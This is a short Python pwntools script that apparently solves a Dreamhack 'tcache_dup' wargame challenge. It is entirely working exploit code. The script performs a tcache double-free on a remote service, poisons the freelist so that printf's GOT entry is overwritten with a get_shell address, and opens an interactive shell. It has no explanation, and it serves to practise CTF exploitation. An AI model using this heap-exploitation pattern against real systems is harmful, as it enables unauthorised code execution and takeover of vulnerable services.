from pwn import *
from pwn import p64

p=remote("host3.dreamhack.games",12110)
e=ELF("./a/tcache_dup")
printf_got=e.got["printf"]
get_shell=0x400ab0

def create(size:int,data):
	p.sendlineafter("> ","1")
	p.sendlineafter("Size: ",str(size))
	p.sendlineafter("Data: ",data)

def delete(idx:int):
	p.sendlineafter("> ","2")
	p.sendlineafter("idx: ",str(idx))

create(32,b'aaaa')
create(32,b'bbbb')

delete(0)
delete(0)

create(32,p64(printf_got))
create(32,p64(printf_got))
create(32,p64(get_shell))

p.interactive()